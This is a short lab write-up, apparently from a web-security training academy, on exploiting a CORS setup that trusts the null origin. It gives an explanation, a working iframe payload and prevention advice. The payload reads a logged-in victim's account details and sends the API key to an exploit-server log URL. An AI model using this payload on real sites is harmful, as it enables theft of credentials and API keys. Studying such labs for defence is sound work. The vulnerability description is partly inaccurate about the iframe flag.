Vulnerability:
	The servers accept null value in the "allow-same-origin" flag in the iframe tag and reflect that value in the "Access-Control-Allow-Origin" header.
	Making the browser accepting cross origin requests.
	
Exploit:
	The attacker is sending a link to the victim to a malicious site.
	The browser is loading the page and running  the script.
	The script is sending a request to the domain he is authenticated too with a null value in the origin header.
	The script then intercept the response containing the victim's API key.
	Then the script surfing to the attacker's website to a non existing directory named the victims API key.
	The attacker is allowed to read the API value in the logs.

Example:
	
	<iframe 
	  sandbox="allow-scripts allow-top-navigation allow-forms" 
	  src='data:text/html,
		<script>
		  var req = new XMLHttpRequest();
		  req.onload = reqListener;
		  req.open("GET", "https://0abb00a1031cebe280c721a5003f0034.web-security-academy.net/accountDetails", true);
		  req.withCredentials = true;
		  req.send();

		  function reqListener() {
		    location = "https://exploit-0a31003203baeb3c803c208b0164000a.exploit-server.net/log?key=" + this.responseText;
		  }
		</script>'>
	</iframe>
	
Prevention:
	- Only echo back ACAO if Origin is in your allowed list.
	- Optional: donâ€™t allow credentials from cross-origins unless strictly necessary.
